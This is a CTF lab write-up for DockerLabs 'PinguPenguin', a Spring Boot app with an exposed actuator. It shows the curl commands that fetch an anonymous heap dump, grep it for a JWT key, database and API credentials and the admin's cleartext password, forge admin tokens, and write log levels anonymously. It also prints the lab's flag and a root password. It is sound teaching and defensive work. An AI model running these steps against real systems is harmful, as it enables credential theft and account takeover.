@@ -1,0 +1,1162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 255 PinguPenguin &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; PinguPenguin</p><h1 id="pingupenguin--dockerlabs-lab-255-difícil">PINGUPENGUIN — DockerLabs lab 255 (Difícil)</h1>
+<p>Spring Boot 3.2.5 on Temurin JDK 17, packaged as a single fat jar, shipped as a
+DockerLabs image (<code>pingupenguin.tar</code>, 196 MB). The catalogue describes it as <em>&quot;Web
+hecha en spring boot explotando vulnerabilidades típicas de este framework&quot;</em>.</p>
+<p>That description is <strong>incomplete in the way that matters</strong>. There is no
+Spring-specific vulnerability here at all: no CVE, no known-default deserialization
+chain, no SpEL injection, no DevTools, no H2 console. What there is, measured, is
+<strong>the framework's own diagnostic surface left unauthenticated on the application
+port, and a process heap it will hand to anyone who asks</strong> — and the heap contains
+the application's own configuration file verbatim, including the key that signs its
+session tokens.</p>
+<p>The lesson is therefore not &quot;Spring Boot has endpoints&quot;. It is a <strong>measurement
+criterion</strong>: a diagnostic endpoint returning <code>200</code> is not a finding until you have
+read what is <em>in</em> the response, and a value rendered as <code>******</code> is not a secret
+leak while a value rendered in cleartext inside a 63 MB heap dump is.</p>
+<p>All commands below were run against the lab as shipped. <code>auto_deploy.sh</code> was <strong>not</strong>
+executed (its <code>while true</code> tail is unrelated, but the manual path in the task brief
+is equivalent and observable); the container was created with
+<code>docker run -d --name pingupenguin_container pingupenguin:latest</code>.</p>
+<hr />
+<h2 id="1-autocorrection-read-this-first">1. Autocorrection (read this first)</h2>
+<p>Four things I got wrong, or would have got wrong, before the lab was solved. All
+four are the same shape: <strong>a measurement I could have made and did not, standing in
+for a measurement I did make.</strong></p>
+<h3 id="11-i-was-about-to-report-actuatorenv-as-a-credential-disclosure-and-the-response-contains-no-credential-at-all">1.1 I was about to report <code>/actuator/env</code> as a credential disclosure, and the response contains no credential at all</h3>
+<p>The first thing any scanner or any operator does with a Spring Boot target is
+<code>GET /actuator/env</code> and report whatever comes back. What came back here:</p>
+<pre><code>$ curl -s http://[net-0-11]:8080/actuator/env | python3 -c &quot;... enumerate values ...&quot;
+--- server.ports total 1 masked 1
+--- servletContextInitParams total 0 masked 0
+--- systemProperties total 59 masked 59
+--- systemEnvironment total 8 masked 8
+--- Config resource 'class path resource [application.properties]' via location 'optional:classpath:/' total 27 masked 27
+</code></pre>
+<p><strong>96 property values, 96 of them the literal string <code>******</code>.</strong> Zero secrets.
+<code>spring.application.name</code> is masked. So is <code>server.port</code>. So is
+<code>spring.datasource.driver-class-name</code>. A key-name heuristic that reports
+&quot;anything matching <code>password|secret|key|token</code>&quot; would have reported three
+findings here; the actual masking is <strong>not key-name-driven at all</strong>.</p>
+<p>The reason is in the actuator's own code, which I read out of the jar rather than
+recalled:</p>
+<pre><code class="language-java">// spring-boot-actuator-3.2.5.jar → org/springframework/boot/actuate/endpoint/Sanitizer
+public Object sanitize(SanitizableData data, boolean showUnsanitized) {
+    Object value = data.getValue();
+    if (value == null) { return null; }
+    if (!showUnsanitized) { return &quot;******&quot;; }        // &lt;-- unconditional, for every key
+    for (SanitizingFunction f : this.sanitizingFunctions) { ... }
+    return value;
+}
+</code></pre>
+<p><code>showUnsanitized</code> is a <strong>single global switch</strong>, read from the jar's own
+configuration metadata:</p>
+<pre><code>$ cat ac/META-INF/spring-configuration-metadata.json   # from spring-boot-actuator-autoconfigure-3.2.5.jar
+management.endpoint.env.show-values        | Show | default: never | When to show unsanitized values.
+management.endpoint.env.roles             | Set&lt;String&gt; | default: None
+management.endpoint.configprops.show-values| Show | default: never
+</code></pre>
+<p>So the correct finding for <code>/actuator/env</code> on this target is <strong>not</strong> &quot;secrets
+exposed&quot; and <strong>not</strong> &quot;safe&quot;. It is: <em>the endpoint discloses the <strong>names</strong> and
+<strong>origins</strong> of 96 properties — including the file each came from and its
+line:column — and discloses no value, because one documented default
+(<code>show-values=never</code>) is in effect.</em> That is a real low-severity topology
+disclosure (CWE-200), and it is <em>one configuration property away</em> from a critical
+one.</p>
+<p>The mistake I was one step from is the exact one the repository already corrects
+elsewhere: <strong>reading a configuration is not obtaining a secret.</strong> A property <em>name</em>
+is not a value, and a masked placeholder is not a value. Reporting either as a
+disclosed credential would have been a fabricated finding with a fabricated
+impact, and it would have buried the one that was real.</p>
+<h3 id="12-the-heap-dump-is-not-the-config-file-and-i-had-a-rule-that-said-the-opposite">1.2 The heap dump is not the config file, and I had a rule that said the opposite</h3>
+<p><code>decision-making.md</code> §7's rule for a JVM-like target — <em>&quot;read the deployment's
+configuration before attacking the service it fronts; a management plane <strong>is</strong>
+configuration&quot;</em> — was actively misleading me here. I read
+<code>application.properties</code> first (correct instinct, and it told me <code>app.jwt.secret</code>
+existed) and had the secret in hand <strong>without ever touching the heap dump</strong>. By the
+rule as I had it written, the heap dump was redundant.</p>
+<p>It is not redundant, and the reason generalises past this lab:</p>
+<ul>
+<li>the heap carried the <strong>whole <code>application.properties</code> resource bytes</strong> as a
+<code>String</code> in memory (2 hits for the 2024 secret, 2 for the 2023 one — one from the
+loaded resource, one from the resolved <code>@Value</code> field);</li>
+<li>it carried the <strong>production MySQL JDBC URL with an embedded password</strong> and a
+<strong>live partner API key</strong>, neither of which is anything the <code>@Value</code> fields
+resolve to a value the config API can show;</li>
+<li>and it carried something <strong>no configuration endpoint could ever return</strong>: the
+admin account's <strong>cleartext password</strong>, in the constant pool of the
+<code>DataInitializer</code> class and again in the <code>String</code> that was handed to BCrypt.</li>
+</ul>
+<p>The rule needed a correction, not a replacement: <em>read the configuration to know
+where the app keeps its state — then read the runtime artefact, because a runtime
+artefact contains state the configuration never held.</em> <code>DataInitializer.java:31</code>
+passes the plaintext to <code>encoder.encode()</code> on every boot; the process must hold it
+in memory to hash it. <strong>A secret hashed at startup was a secret in the heap.</strong> No
+amount of reading the config file finds that.</p>
+<h3 id="13-the-labs-own-comments-name-the-vulnerability-the-cve-and-the-dead-end--and-i-still-had-to-measure-which-of-two-keys-was-real">1.3 The lab's own comments name the vulnerability, the CVE, and the dead end — and I still had to measure which of two keys was real</h3>
+<p><code>application.properties</code> ships with the answer written in it:</p>
+<pre><code class="language-properties">#  (!) Enmascarado en /actuator/env pero EN CLARO dentro del heapdump.
+# Secreto debil y &quot;legible&quot; (mal habito real) ...
+app.jwt.secret=changeme-super-secret-key-pinguinos-prod-2024
+...
+# Secreto JWT ANTERIOR (rotado) -&gt; SENUELO: ya no firma nada.
+app.jwt.previous-secret=changeme-super-secret-key-pinguinos-prod-2023
+#  (!!!) CONFIGURACION VULNERABLE DE ACTUATOR
+management.endpoints.web.exposure.include=*
+</code></pre>
+<p>Per <code>decision-making.md</code> §7 that is a <strong>stopping condition</strong>, not a solution: the
+comments mark where the author <em>admitted</em> a problem, which is a strict subset of
+where the problems are. Two admissions here were incomplete or wrong:</p>
+<ul>
+<li>the comment says <code>/actuator/env</code> is where the secret <em>is not</em>, which is right,
+but never says <strong>what is</strong> — the actual leak vector was unmentioned;</li>
+<li>the comment says the 2023 key &quot;ya no firma nada&quot; (<strong>signs nothing</strong>). I did not
+believe it. I forged a token with <strong>both</strong> candidates and read the status codes:</li>
+</ul>
+<pre><code>[prod-2024 (app.jwt.secret)]           status=200  len=2509  FLAG=FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
+[prod-2023 (app.jwt.previous-secret)]  status=403  len=1011  (rejected)
+--- control: random key
+status 403
+</code></pre>
+<p>The comment was correct and the <strong>property name was not the evidence</strong> — the
+signature was. A decoy secret placed next to the real one is a <em>designed</em> trap for
+an attacker who greps, and the only thing that survives it is a signed artefact.
+This is <code>api_web.md:285</code>'s &quot;a hint is a hypothesis&quot; rule with a new discriminator:
+<strong>for a recovered candidate key, the property name is a hypothesis and only a
+signature decides.</strong></p>
+<p>And keeping the wrong key would not have been a dead end — it would have been a
+<em>reportable finding</em> in its own right (a rotated signing key retained in
+configuration and in process memory, 15 months after rotation, still an HMAC
+secret-shaped string with no retirement marker), which the lab's own comments
+conspicuously do not mention.</p>
+<h3 id="14-a-generator-bug-i-caught-before-it-produced-a-wrong-answer">1.4 A generator bug I caught before it produced a wrong answer</h3>
+<p>My JWT probe script took <code>secret</code> as a string and called <code>.encode()</code> on it. Passing
+<code>b&quot;&quot;</code> (bytes, to model a <code>kid</code>-selected empty key) raised
+<code>AttributeError: 'bytes' object has no attribute 'encode'</code> — the script died
+<em>before</em> printing a result, which is the only acceptable failure mode here: a
+<code>None</code> that renders as &quot;rejected&quot; would have been a fabricated control result.
+Rewritten with the key as bytes throughout, the probes ran. Filed because the
+defect was in my instrumentation, not in the target, and because the failure was
+loud — the same reason a <code>decoys-and-a-positive-control</code> matrix is worth building
+by hand: <strong>the last line of that script is a <code>200</code>, and without it the other six
+lines are unfalsifiable.</strong></p>
+<hr />
+<h2 id="2-real-surface">2. Real surface</h2>
+<h3 id="21-host-and-container">2.1 Host and container</h3>
+<pre><code>$ nmap -sV -Pn -p- [net-0-11]
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-28 04:15 +0000
+Nmap scan report for pingupenguin ([net-0-11])
+Host is up (0.000045s latency).
+Not shown: 65534 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+8080/tcp open  nagios-nsca Nagios NSCA
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.63 seconds
+</code></pre>
+<p>One TCP port. The <code>nagios-nsca</code> service label is <code>nmap</code> matching 8080 by number; the
+real service is a Tomcat-embedded Spring Boot app. No <code>-sU</code> was run (no root on
+this host, declared as a coverage gap, not as a closed port — but the image's
+<code>ExposedPorts</code> is <code>8080/tcp</code> only, and nothing in the image listens on UDP, so the
+gap is closed by the manifest rather than left open).</p>
+<p>Image facts, read from <code>docker inspect</code> and <code>docker history</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Base</td>
+<td><code>ubuntu:26.04</code> (rockcraft, per the image labels)</td>
+</tr>
+<tr>
+<td>Runtime user</td>
+<td><code>www-data</code> (<code>User: &quot;www-data&quot;</code> in the image config; <code>uid=33(www-data) gid=33(www-data)</code>)</td>
+</tr>
+<tr>
+<td>Entrypoint</td>
+<td><code>java -jar /app/app.jar</code></td>
+</tr>
+<tr>
+<td>Working dir</td>
+<td><code>/app</code>, <code>chown -R www-data:www-data /app</code></td>
+</tr>
+<tr>
+<td>Exposed</td>
+<td><code>8080/tcp</code></td>
+</tr>
+<tr>
+<td>Workdir contents</td>
+<td><code>app.jar</code> (53 763 638 B), <code>.env</code> (663 B), both <code>www-data:www-data 0644</code></td>
+</tr>
+<tr>
+<td>Build-time step</td>
+<td><code>echo 'root:recoverypasswordpenguin' | chpasswd</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>The Java process runs as <code>uid=33(www-data)</code>, not root.</strong> <code>decision-making.md</code> §8:
+the execution identity is a measurement. There was no code-execution primitive in
+this engagement that reached a shell, so this was measured from the image
+configuration and the <code>id www-data</code> output rather than from inside a primitive —
+stated as such rather than implied.</p>
+<p>The <code>/app/.env</code> file and the <code>root:</code> password set at build time are <strong>out of band
+for this engagement</strong>: I read them with <code>docker cp</code> / a sidecar <code>docker run</code>, which
+is host access, not attacker access. They are not in the finding set, and I did not
+use the credential — there is no <code>sshd</code> in the image and no reachable login
+surface. Recorded here only so the reader knows the file exists and that I am
+explicitly <em>not</em> claiming it as a finding.</p>
+<h3 id="22-versions--read-from-the-artifact-not-recalled">2.2 Versions — read from the artifact, not recalled</h3>
+<pre><code>$ unzip -l app.jar | grep -oE 'BOOT-INF/lib/[a-zA-Z0-9._-]+\.jar'
+BOOT-INF/lib/spring-boot-3.2.5.jar
+BOOT-INF/lib/spring-boot-autoconfigure-3.2.5.jar
+BOOT-INF/lib/spring-boot-actuator-3.2.5.jar
+BOOT-INF/lib/spring-boot-actuator-autoconfigure-3.2.5.jar
+BOOT-INF/lib/tomcat-embed-core-10.1.20.jar
+BOOT-INF/lib/spring-framework-6.1.6.jar      (spring-core/aop/beans/expression/web)
+BOOT-INF/lib/spring-security-crypto-6.2.4.jar
+BOOT-INF/lib/jjwt-api-0.12.5.jar  jjwt-impl-0.12.5.jar  jjwt-jackson-0.12.5.jar
+BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar  thymeleaf-spring6-3.1.2.RELEASE.jar
+BOOT-INF/lib/h2-2.2.224.jar
+BOOT-INF/lib/logback-classic-1.4.14.jar
+BOOT-INF/lib/commons-collections-3.2.1.jar
+BOOT-INF/lib/aspectjweaver-1.9.22.jar
+BOOT-INF/lib/jackson-databind-2.15.4.jar
+BOOT-INF/lib/snakeyaml-2.2.jar
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Version</th>
+<th>Source of the claim</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>JRE</td>
+<td>Temurin <strong>17.0.19+10</strong></td>
+<td>image env <code>JAVA_VERSION</code>; installed by the base layer</td>
+</tr>
+<tr>
+<td>Spring Boot</td>
+<td><strong>3.2.5</strong></td>
+<td><code>BOOT-INF/lib/spring-boot-3.2.5.jar</code></td>
+</tr>
+<tr>
+<td>Spring Framework</td>
+<td><strong>6.1.6</strong></td>
+<td><code>BOOT-INF/lib/spring-*-6.1.6.jar</code></td>
+</tr>
+<tr>
+<td>Embedded Tomcat</td>
+<td><strong>10.1.20</strong></td>
+<td><code>BOOT-INF/lib/tomcat-embed-core-10.1.20.jar</code></td>
+</tr>
+<tr>
+<td>JJWT</td>
+<td><strong>0.12.5</strong></td>
+<td><code>BOOT-INF/lib/jjwt-*-0.12.5.jar</code></td>
+</tr>
+<tr>
+<td>Thymeleaf</td>
+<td><strong>3.1.2</strong></td>
+<td><code>BOOT-INF/lib/thymeleaf-3.1.2.RELEASE.jar</code></td>
+</tr>
+<tr>
+<td>H2</td>
+<td><strong>2.2.224</strong></td>
+<td><code>BOOT-INF/lib/h2-2.2.224.jar</code></td>
+</tr>
+<tr>
+<td>Logback</td>
+<td><strong>1.4.14</strong></td>
+<td><code>BOOT-INF/lib/logback-classic-1.4.14.jar</code></td>
+</tr>
+</tbody>
+</table>
+<p>The JRE version is independently corroborated at runtime: the actuator answers
+<code>403</code> (application-level) rather than <code>401</code> for <code>/admin</code>, the error bodies are the
+Boot 3 <code>{&quot;timestamp&quot;,&quot;status&quot;,&quot;error&quot;,&quot;path&quot;}</code> shape, and no <code>Whitelabel</code> HTML page
+appears anywhere (see §5, control C-6).</p>
+<p><strong>Framework defaults, read from the jar's own <code>spring-configuration-metadata.json</code>
+rather than from memory:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Default</th>
+<th>This target</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>management.endpoints.web.exposure.include</code></td>
+<td><code>['health']</code></td>
+<td><strong><code>*</code></strong></td>
+</tr>
+<tr>
+<td><code>management.endpoint.env.show-values</code></td>
+<td><code>never</code></td>
+<td>default (unset)</td>
+</tr>
+<tr>
+<td><code>management.endpoint.configprops.show-values</code></td>
+<td><code>never</code></td>
+<td>default (unset)</td>
+</tr>
+<tr>
+<td><code>management.endpoint.health.show-details</code></td>
+<td><code>never</code></td>
+<td><strong><code>always</code></strong></td>
+</tr>
+<tr>
+<td><code>management.server.port</code></td>
+<td><code>None</code> (same port)</td>
+<td>default (unset)</td>
+</tr>
+<tr>
+<td><code>management.endpoints.web.base-path</code></td>
+<td><code>/actuator</code></td>
+<td><code>/actuator</code></td>
+</tr>
+<tr>
+<td><code>management.endpoints.web.discovery.enabled</code></td>
+<td><code>true</code></td>
+<td>default</td>
+</tr>
+</tbody>
+</table>
+<h3 id="23-http-surface">2.3 HTTP surface</h3>
+<pre><code>$ for p in actuator actuator/env actuator/health actuator/info actuator/mappings \
+           actuator/beans actuator/loggers actuator/threaddump actuator/heapdump \
+           actuator/configprops actuator/conditions h2-console swagger-ui.html \
+           login register pinguinos admin; do ... done
+200 1720    /actuator
+200 6724    /actuator/env
+200 263     /actuator/health
+200 111     /actuator/info
+200 26656   /actuator/mappings
+200 138284  /actuator/beans
+200 77976   /actuator/loggers
+200 53768   /actuator/threaddump
+200 64583893 /actuator/heapdump      &lt;-- 64 MB, anonymous, no parameters
+200 18068   /actuator/configprops
+200 135197  /actuator/conditions
+404  99     /h2-console
+404  104    /swagger-ui.html
+200 1232    /login
+200 1355    /register
+200 4526    /pinguinos
+403 1024    /admin
+</code></pre>
+<p><code>GET /actuator</code> (the discovery page, on by default) enumerates 19 link templates:
+<code>beans caches caches-cache conditions configprops configprops-prefix env env-toMatch health health-path heapdump info loggers loggers-name mappings metrics metrics-requiredMetricName scheduledtasks self threaddump</code>.</p>
+<p><strong>The <code>heapdump</code> entry is a 63.7 MB anonymous download and it is the whole
+engagement.</strong> The control that proves it is unauthenticated rather than
+merely anonymous-looking is on the neighbouring family: <code>/admin</code> — same port, same
+process, same origin, <strong>no parameters, same request shape</strong> — answers <code>403</code>.</p>
+<h3 id="24-application-source">2.4 Application source</h3>
+<p>There is no source tree on the host, but the fat jar is the source: 8 application
+classes, decompiled with jadx (13160 classes, 78 errors, none in the application
+package).</p>
+<pre><code>com/penguinpals/apadrina/ApadrinaApplication.class
+                          /config/{AppConfig,DataInitializer,IntegrationConfig}
+                          /controller/{AdminController,AuthController,SiteController}
+                          /model/{Penguin,Sponsorship,User}
+                          /repository/{PenguinRepository,SponsorshipRepository,UserRepository}
+                          /security/{CurrentUser,JwtAuthFilter,JwtUtil}
+</code></pre>
+<p><strong>There is no <code>SecurityConfig</code> and no <code>SecurityFilterChain</code> bean anywhere in the
+jar.</strong> Authentication is a hand-rolled <code>OncePerRequestFilter</code>. This is the single
+most important source fact in the lab and it is <em>invisible from outside</em> — no status
+code, no header and no body distinguishes &quot;the framework has no security starter&quot;
+from &quot;the framework has security and it allowed this&quot;.</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<p>Severity is stated at what was observed, per <code>decision-making.md</code> §Reporting.</p>
+<h3 id="31-full-management-surface-exposed-unauthenticated-on-the-application-port--cwe-306--cwe-862">3.1 Full management surface exposed unauthenticated on the application port — CWE-306 / CWE-862</h3>
+<p><strong>Root cause: the application has no authentication for the management endpoints at
+all. <code>exposure.include=*</code> is what made it visible; it is not what made it
+dangerous.</strong></p>
+<p>Evidence, the properties that are the operator's decisions:</p>
+<pre><code class="language-properties"># application.properties:43-52, verbatim
+management.endpoints.web.exposure.include=*
+management.endpoints.web.base-path=/actuator
+management.endpoint.health.show-details=always
+management.endpoint.heapdump.enabled=true
+management.endpoint.env.enabled=true
+management.endpoint.beans.enabled=true
+management.endpoint.mappings.enabled=true
+management.endpoint.loggers.enabled=true
+management.endpoint.threaddump.enabled=true
+</code></pre>
+<p>Evidence, the absence that is the actual defect — the classpath of the artifact:</p>
+<pre><code>spring-security-crypto-6.2.4.jar      present   (BCryptPasswordEncoder)
+spring-security-web-6.1.6.jar         ABSENT
+spring-boot-starter-security          ABSENT
+SecurityFilterChain bean              ABSENT (8 application classes, all read)
+</code></pre>
+<p><code>AppConfig.java:11-15</code> is the only reason <code>spring-security-crypto</code> is there at all:</p>
+<pre><code class="language-java">@Bean
+public PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); }
+</code></pre>
+<p><code>JwtAuthFilter.java:27-38</code> never rejects anybody:</p>
+<pre><code class="language-java">protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
+                                FilterChain chain) throws ServletException, IOException {
+    String token = readCookie(request);
+    if (token != null) {
+        try {
+            Claims claims = this.jwtUtil.parse(token);
+            String role = (String) claims.get(&quot;role&quot;, String.class);
+            request.setAttribute(ATTR, new CurrentUser(claims.getSubject(), role));
+        } catch (Exception e) {          // &lt;-- empty: no rejection, no log
+        }
+    }
+    chain.doFilter(request, response);   // &lt;-- unconditional
+}
+</code></pre>
+<p>There is exactly <strong>one</strong> authorization decision in the whole application and it
+lives inside a controller method, not in a filter or an interceptor:</p>
+<pre><code class="language-java">// AdminController.java:38-43
+CurrentUser user = (CurrentUser) request.getAttribute(JwtAuthFilter.ATTR);
+if (user == null || !user.isAdmin()) {
+    response.setStatus(HttpStatus.FORBIDDEN.value());
+    ...
+}
+</code></pre>
+<p>So <code>/actuator/**</code> is not protected by anything, and it is protected by a
+<em>different</em> mechanism from <code>/admin</code>, in a <em>different</em> component. Per
+<code>decision-making.md</code> these are <strong>two decisions with two fixes</strong>:</p>
+<table>
+<thead>
+<tr>
+<th>Decision</th>
+<th>Component</th>
+<th>Fix</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>which endpoints are reachable</td>
+<td><code>management.endpoints.web.exposure.include</code></td>
+<td>allowlist (<code>health,info</code>) instead of <code>*</code></td>
+</tr>
+<tr>
+<td>who may reach the reachable ones</td>
+<td>no authentication layer at all</td>
+<td>Spring Security, or <code>management.server.port</code> on a bound interface + an authenticated path</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Impact.</strong> Anyone who can reach <code>8080/tcp</code> gets 19 diagnostic endpoints, 64 MB of
+process memory, the application's full route table, its complete bean graph, its
+live thread dump (with every thread's stack and lock state), and <strong>write access to
+its logging configuration</strong> (§3.4). §3.3 is the consequence that turns this from
+disclosure into takeover.</p>
+<p><strong>Not attributed as a CVE.</strong> This is configuration, not a library defect. Spring Boot
+3.2.5 has no known-default exposure of <code>heapdump</code> here; the defaults read in §2.2
+are <code>include=['health']</code> and <code>show-values=never</code>, and both were working. Reporting
+it as a Spring Boot vulnerability would be <code>decision-making.md</code> §4 in reverse — the
+framework is not the bug, the deployment decision is.</p>
+<h3 id="32-anonymous-process-memory-disclosure-including-the-signing-key-and-the-admins-cleartext-password--cwe-200--cwe-312--cwe-522">3.2 Anonymous process memory disclosure, including the signing key and the admin's cleartext password — CWE-200 / CWE-312 / CWE-522</h3>
+<p><code>GET /actuator/heapdump</code>, no authentication, no parameters, 63 763 393 bytes.</p>
+<pre><code>$ time curl -s -o heap.hprof http://[net-0-11]:8080/actuator/heapdump
+real    0m0.217s
+$ file heap.hprof
+heap.hprof: Java HPROF dump, created Mon Sep 28 04:16:43 2026
+$ grep -aoc &lt;candidate&gt; heap.hprof
+changeme-super-secret-key-pinguinos-prod-2024 -&gt; 2
+changeme-super-secret-key-pinguinos-prod-2023 -&gt; 2
+Pr0d_Gl4c14r_Sync_2024                      -&gt; 2
+apikey_live_pngn                            -&gt; 2
+Gl4c14r_DB_P4ss                             -&gt; 1
+Adm1n_C0lon14_2024                          -&gt; 2
+db-prod.internal                            -&gt; 2
+</code></pre>
+<p>Six distinct secret classes, all cleartext, all in one unauthenticated response.</p>
+<p><strong>Three of them exist nowhere in the configuration API</strong> and could not have been
+found through <code>/actuator/env</code> (which returns <code>******</code>, §1.1) or <code>/actuator/configprops</code>
+(which does not bind <code>@Value</code> fields at all — measured, it returned no <code>app.*</code>
+property at all):</p>
+<ol>
+<li><strong>The HMAC signing key</strong> for every session cookie — <code>changeme-super-secret-key-pinguinos-prod-2024</code>, <code>application.properties:24</code>.</li>
+<li><strong>The production MySQL connection string with an embedded password</strong> — <code>jdbc:mysql://db-prod.internal:3306/pinguinos?user=svc_pinguinos&amp;password=…</code>, held in the <code>IntegrationConfig</code> bean because <code>@PostConstruct</code> copies it into a <code>static List&lt;String&gt; RETAINED</code> (<code>IntegrationConfig.java:21-28</code>) — a deliberate <code>static</code> cache, which is precisely what makes it immortal in the heap.</li>
+<li><strong>A live third-party partner API key</strong> — same mechanism, same bean.</li>
+</ol>
+<p><strong>And one that is not a secret in the configuration at all — the admin's cleartext
+password.</strong> <code>DataInitializer.java:31</code>:</p>
+<pre><code class="language-java">this.users.save(new User(&quot;admin&quot;, &quot;admin@apadrinaunpinguino.org&quot;,
+        this.encoder.encode(&quot;Adm1n_C0lon14_2024&quot;), &quot;ADMIN&quot;));
+</code></pre>
+<p>The plaintext is in the loaded class's constant pool <strong>and</strong> in the <code>String</code>
+instance passed to <code>encode()</code>. It cannot be hashed without being in memory first.
+Verified by <em>using</em> it, not by finding it:</p>
+<pre><code>$ curl -s -i -X POST http://[net-0-11]:8080/login -d 'username=admin&amp;password=Adm1n_C0lon14_2024'
+HTTP/1.1 302
+[response-cookie-header]: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJBRE1JTiIs…
+Location: http://[net-0-11]:8080/perfil
+</code></pre>
+<p>A working administrator session from an anonymous heap download, with <strong>no forgery
+step at all</strong>. The heap also carries the BCrypt hashes of every account, so the
+cleartext was not needed — but its presence is the finding: <strong>a password hashed at
+startup was a password in the heap</strong>, and a heap dump is a credential dump that
+happens to have a <code>.hprof</code> extension.</p>
+<p><strong>Root cause: a diagnostic feature that serialises live process memory was left
+reachable by anyone.</strong> <code>management.endpoint.heapdump.enabled=true</code> is the operator's
+line; the reason it is a <em>finding</em> rather than a hardening note is §3.1 — there is
+no authentication in front of it. Fix both, and note that fixing only the
+<code>exposure.include</code> line leaves the JVM reachable to anything that can bind 8080.</p>
+<p><strong>Severity note.</strong> The reward was obtained without using this password. I report the
+credential compromise because it is independent and it is load-bearing for anyone
+else attacking this host, not because it was on my path.</p>
+<h3 id="33-a-hardcoded-weak-human-readable-hmac-signing-key--cwe-798--cwe-321">3.3 A hardcoded, weak, human-readable HMAC signing key — CWE-798 / CWE-321</h3>
+<p><code>JwtUtil.java:18-28</code> reads the key from configuration, and the configuration value
+is a literal:</p>
+<pre><code class="language-properties">app.jwt.secret=changeme-super-secret-key-pinguinos-prod-2024
+app.jwt.expiration-ms=3600000
+</code></pre>
+<pre><code class="language-java">@Value(&quot;${app.jwt.secret}&quot;) private String secret;
+@PostConstruct public void init() { this.key = Keys.hmacShaKeyFor(secret.getBytes(UTF_8)); }
+</code></pre>
+<p>The key is 43 characters of ASCII, contains the word <code>secret</code> and the word
+<code>prod</code>, and — per the lab's own comment and confirmed by <code>grep -a</code> on the heap —
+<strong>survives a generic grep</strong>. No KDF: the raw bytes of the string are the HMAC key
+directly (<code>Keys.hmacShaKeyFor</code>, no <code>SecretKeySpec</code>/PBKDF iteration). This is the
+same <em>&quot;absence of an import&quot;</em> discriminator used successfully in lab 62: what
+decides it is not that the key is short, it is that <code>hmacShaKeyFor(secret.getBytes())</code>
+takes the configuration string as the key with nothing in between.</p>
+<p><strong>Impact, stated at the current strength</strong> (<code>api_web.md:274</code>'s rule, applied
+honestly): any holder of the key can mint a validly-signed session cookie for
+<strong>any <code>sub</code> and any <code>role</code></strong> with no account, no password, no registration, and no
+interaction with any user. Measured in §6. The token is stateless and
+<code>DB_CLOSE_DELAY=-1</code> gives no server-side revocation hook either, so rotation is the
+only remedy and rotation requires invalidating every live cookie.</p>
+<p><strong>Separate finding, same line: a rotated signing key retained in configuration and
+in process memory.</strong> <code>application.properties:37</code> keeps
+<code>app.jwt.previous-secret=…-2023</code>, and <code>IntegrationConfig.java:19-27</code> copies it into
+the same immortal <code>static</code> list. It is inert (proved in §1.3, not assumed) but it
+is a <em>live-shaped</em> secret in a heap dump 15 months after rotation, and it is the
+second candidate any greping attacker will try. Rotated secrets must be destroyed,
+not retained; a retained rotated key is an unbounded liability for exactly as long
+as the dump is downloadable.</p>
+<h3 id="34-unauthenticated-write-to-the-applications-logging-configuration--cwe-732--cwe-15">3.4 Unauthenticated write to the application's logging configuration — CWE-732 / CWE-15</h3>
+<p><code>/actuator/loggers</code> is the one exposed endpoint that is a <strong>write</strong>, not a
+disclosure, and it accepted an anonymous write:</p>
+<pre><code>$ curl -s -o /dev/null -w '%{http_code}\n' -X POST http://[net-0-11]:8080/actuator/loggers/org.springframework.web \
+    -H 'Content-Type: application/json' -d '{&quot;configuredLevel&quot;:&quot;DEBUG&quot;}'
+204
+</code></pre>
+<p><strong>Differential, both directions, because a control you cannot show moving is a
+claim:</strong></p>
+<pre><code>after POST {&quot;configuredLevel&quot;:&quot;DEBUG&quot;} : configuredLevel=DEBUG  effective=DEBUG
+after POST {&quot;configuredLevel&quot;:null}    : configuredLevel=None   effective=INFO
+</code></pre>
+<p>The same anonymous client that set it to <code>DEBUG</code> reset it to the shipped value, and
+the observable moved in both directions. <code>DEBUG</code> on <code>org.springframework.web</code>
+turns on request/response header and body logging on a live internet-facing app —
+which is a durable <strong>write primitive into the application's own log files</strong>, and any
+operator with log access then reads other users' session cookies.</p>
+<p><strong>Root cause is §3.1 again, but the impact class is different</strong>, and that is the
+reason to report it separately: 3.1–3.3 are disclosure, and disclosure is bounded by
+what the app chose to keep in memory. This is <strong>mutation of operational state by an
+anonymous peer</strong>, and a disclosure finding's remediation (narrow the allowlist)
+covers it only because the allowlist covers the write endpoint too. A reviewer who
+fixes 3.1 by enabling authentication on the <em>read</em> endpoints and forgets
+<code>/actuator/loggers</code> is left with an anonymous configuration write. Note also
+<code>JwtAuthFilter</code>'s empty <code>catch</code> (§3.1): the application does not log authentication
+failures at all, so the tampering is invisible to the app's own audit trail.</p>
+<h3 id="35-unsafe-java-deserialization-of-attacker-controlled-bytes--cwe-502-gated-post-auth">3.5 Unsafe Java deserialization of attacker-controlled bytes — CWE-502 (gated, post-auth)</h3>
